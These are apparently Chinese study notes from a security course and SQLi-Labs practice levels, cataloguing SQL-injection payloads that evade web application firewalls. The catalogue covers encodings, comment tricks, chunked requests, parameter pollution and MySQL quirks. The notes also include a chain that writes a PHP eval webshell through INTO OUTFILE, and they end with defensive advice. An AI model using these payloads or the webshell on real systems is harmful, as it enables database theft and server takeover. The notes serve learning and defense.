# 2026-07-30 SQL 注入 WAF 绕过技术体系

> 课程来源：小迪安全 + 实战靶场（SQLi-Labs Less-5/6/7）
> 核心思路：WAF 本质是正则/关键字匹配，绕过就是在**语义不变的前提下**改变语法形式。

---

## 一、WAF 绕过的三个维度

```
┌──────────┐    ┌──────────┐    ┌──────────┐
│  数据层面  │    │  方式层面  │    │  高级技巧  │
│ (改Payload)│    │ (改请求)  │    │ (组合技)  │
└─────┬────┘    └─────┬────┘    └─────┬────┘
      │               │               │
  大小写           更改提交方式      Fuzz 大法
  编码解码         分块传输          垃圾数据溢出
  等价函数         变异              参数污染
  特殊符号                          HTTP 参数污染
  注释符混用                        数据库特性
  反序列化
```

---

## 二、数据层面 — 修改 Payload 本身

### 2.1 大小写绕过

**原理：** SQL 关键字不区分大小写，WAF 关键词库可能只匹配某一种写法。

```sql
-- 原始（可能被拦）
AND 1=1 UNION SELECT 1,2,3

-- 大小写变形（语义不变）
aNd 1=1 UniON SeLeCT 1,2,3
```

### 2.2 编码解码绕过

#### URL 编码
```sql
-- 单引号 URL 编码
'   →   %27
"   →   %22
空格 →   %20
#   →   %23

-- 原始
?id=1' and 1=1 --+

-- URL 编码后
?id=1%27%20and%201=1%20--+
```

#### 双重 URL 编码
```
%27 → %25%32%37（如果 WAF 只解码一次，可能漏过）
```

#### 十六进制编码
```sql
-- 字符转十六进制（绕过引号过滤）
'admin'  →  0x61646D696E
'security' → 0x7365637572697479

-- 用法示例
SELECT * FROM users WHERE username=0x61646D696E  -- 等价于 username='admin'
```

#### Unicode / 宽字节编码
```sql
-- 宽字节注入（GBK 编码环境）
%df%27  →  縗  （%df 和 %5c 组合成汉字，吃掉转义符 \）
```

### 2.3 等价函数替换

**原理：** 同一种功能有多个函数实现，WAF 可能漏掉冷门函数。

| 被过滤 | 等价替代 | 说明 |
|--------|---------|------|
| `substr()` | `substring()`, `mid()` | 截取字符串 |
| `ascii()` | `ord()` | 字符转 ASCII |
| `sleep()` | `benchmark()`, `get_lock()`, 笛卡尔积 | 延时 |
| `updatexml()` | `extractvalue()`, `polygon()`, `exp()` | 报错注入 |
| `group_concat()` | `concat()` + 子查询 | 拼接结果 |
| `union select` | `union all select` | 联合查询 |
| `=` | `like`, `regexp`, `between`, `in` | 条件判断 |
| 空格 | `/**/`, `%09`(TAB), `%0a`(换行), `()` | 分隔符 |

### 2.4 特殊符号绕过

#### 空格替代（最常见）
```sql
-- 原始
SELECT * FROM users WHERE id=1

-- /**/ 注释符替代空格（你印象最深的）
SELECT/**/*/**/FROM/**/users/**/WHERE/**/id=1

-- 括号替代空格
SELECT(*)FROM(users)WHERE(id=1)

-- 反引号（MySQL 列名/表名可以用反引号包裹）
SELECT`id`,`username`FROM`users`

-- 换行符 %0a
SELECT%0a*%0aFROM%0ausers

-- TAB %09
SELECT%09*%09FROM%09users
```

#### 引号替代
```sql
-- 原始
SELECT * FROM users WHERE username='admin'

-- 十六进制替代引号
SELECT * FROM users WHERE username=0x61646D696E

-- char() 函数拼接
SELECT * FROM users WHERE username=CHAR(97,100,109,105,110)
```

### 2.5 注释符混用

```sql
-- 行内注释 /**/
SEL/**/ECT

-- 行尾注释（三种等价）
AND 1=1 -- ...        -- 要求 -- 后跟空格
AND 1=1 # ...         -- # 不需要空格
AND 1=1 ;%00          -- 空字节截断（部分 PHP 版本）

-- 嵌套注释（MySQL 特性）
UN/**/ION SEL/**/ECT

-- 注释 + 换行组合
UNION%0aSELECT        -- 换行分隔
```

### 2.6 反序列化绕过

**原理：** WAF 只检查明文参数，不解析序列化对象中的数据。

```php
// 正常参数
?id=1' union select 1,2,3

// 序列化后（WAF 可能不解析序列化字符串内部）
// 参数变成：data=O:4:"User":1:{s:2:"id";s:19:"1' union select 1,2,3";}
```

---

## 三、方式层面 — 修改提交方式

### 3.1 更改请求方式

**原理：** WAF 可能只检查 GET 参数，不检查 POST/Cookie/HTTP 头。

| 绕过手法 | 说明 |
|----------|------|
| GET → POST | 把参数从 URL 移到 POST Body |
| POST → Cookie | WAF 可能不解析 Cookie 中的参数 |
| URL → HTTP Header | 通过 `User-Agent` / `X-Forwarded-For` 等头注入 |
| Content-Type 切换 | `application/x-www-form-urlencoded` → `multipart/form-data` 或 `application/json` |

```http
# 原始 GET
GET /page.php?id=1' and 1=1 HTTP/1.1

# 改成 POST
POST /page.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

id=1' and 1=1

# 改成 Cookie 注入
Cookie: id=1' and 1=1
```

### 3.2 分块传输（Chunked Transfer）

```
# 正常传输
POST /page.php HTTP/1.1
Content-Length: 10

id=1 and 1

# 分块传输（WAF 可能不重组分块，直接放过）
POST /page.php HTTP/1.1
Transfer-Encoding: chunked

2
id
2
=1
2
 an
2
d 1
```

### 3.3 变异（Mutation）

**原理：** WAF 和 Web 服务器对同一请求的解析方式可能不同。

```http
# 参数名变形（WAF 查 id，服务器用 ID）
?id=1' union select 1         -- 被拦
?ID=1' union select 1         -- 可能绕过（大小写差异）

# 多参数重名（参数污染）
?id=1&id=2' union select 1    -- WAF 读第一个 id=1，服务器取第二个

# HTTP/0.9 降级
# 某些 WAF 不解析 HTTP/0.9 协议的请求体
```

---

## 四、高级绕过技巧

### 4.1 Fuzz 大法

**核心思路：** 自动化测试 WAF 规则，找漏网之鱼。

```
测试维度：
├── 关键字变形：SeLeCt, SEL/**/ECT, SELECT%0a, \nSELECT
├── 空格替换：/**/, %09, %0a, %0d, %0c, %a0, ()
├── 引号替换：0x..., CHAR(), %27
├── 注释变体：--+, #, ;%00, --%20, --%09
└── 组合测试：大小写 + 注释 + 空格混用
```

**Fuzz 字典：** `sqlifuzzer.py` 等工具自动组合这些变形，逐个发包看哪个能过。

### 4.2 数据库特性利用

| 数据库 | 特性 | 利用方式 |
|--------|------|---------|
| MySQL | `/*!...*/` 条件执行注释 | `/*!50000UNION*/` — MySQL >=5.0 时执行 |
| MySQL | 科学计数法 | `1e0union` = `1 union` |
| MySQL | 反引号 | `` `id` `` 代替 `id` |
| MSSQL | `[ ]` 括号列名 | `[id]` 代替 `id` |
| Oracle | `--+` 失效 | Oracle 单行注释是 `--`，换行才可用 |
| PostgreSQL | `$TAG$` 字符串 | `$x$admin$x$` 代替 `'admin'` |

### 4.3 垃圾数据溢出

**原理：** 在 Payload 前填充大量无害数据，让 WAF 的检测缓冲区溢出或超时。

```sql
-- 正常（被拦）
?id=1' union select 1,2,3

-- 溢出变形
?id=1' AND 1=1 AND 1=1 AND 1=1 AND 1=1 ... (重复100次) union select 1,2,3
-- 或
?id=1&a=1111&b=2222&c=3333... (大量无关参数)
```

### 4.4 HTTP 参数污染（HPP）

**原理：** 同一参数传多个值，WAF 和服务器取不同的值。

```http
# WAF 检查第一个 id（=1），服务器拼接第二个（=2' union select...）
?id=1&id=2' union select 1,2,3

# PHP 环境下：$_GET['id'] 返回最后一个值
# ASP.NET 环境下：$_GET['id'] 返回用逗号拼接的所有值
```

---

## 五、实战绕过思路总结

```
拿到注入点 → 有 WAF 拦截？
                │
        ┌───────┴───────┐
        ↓               ↓
      不拦             拦了
    正常注入      ┌── 换编码（URL/Hex/Unicode）
                 │
                 ├── 换大小写变形
                 │
                 ├── 关键字加注释符 /**/
                 │
                 ├── 换等价函数
                 │
                 ├── 换提交方式（GET→POST→Cookie）
                 │
                 ├── 加垃圾数据填充
                 │
                 └── Fuzz 组合技
```

---

## 六、今日实战回顾

| 关卡 | 核心技术 | 关键收获 |
|------|---------|---------|
| Less-5 | 报错注入 `updatexml` | `substr()` 分段读取超长数据，每段 32 位 |
| Less-6 | 双引号闭合 | 换引号即可，Payload 结构不变 |
| Less-7 | `INTO OUTFILE` 写 webshell | SQL 注入 → 文件写入 → 蚁剑连接的完整攻击链 |

**Less-7 攻击链回顾：**
```
闭合')) → order by 测字段数 → union select 1,2,'<?php @eval($_POST[1]);?>'
→ INTO OUTFILE 写 shell.php → 蚁剑连接 → 服务器控制权
```

**防御纵深：** 防注入（参数化查询）> 防写文件（secure_file_priv=NULL）> 检测 webshell（WAF/查杀）> 最小权限

---

## 七、总结

> WAF 绕过的本质：**语义不变，语法变形。** MySQL 的灵活语法给了攻击者大量变形空间，WAF 依赖的正则规则很难穷举所有写法。
>
> 最好的防御不是围绕 WAF 打补丁，而是从源头杜绝 SQL 注入 —— **参数化查询**。

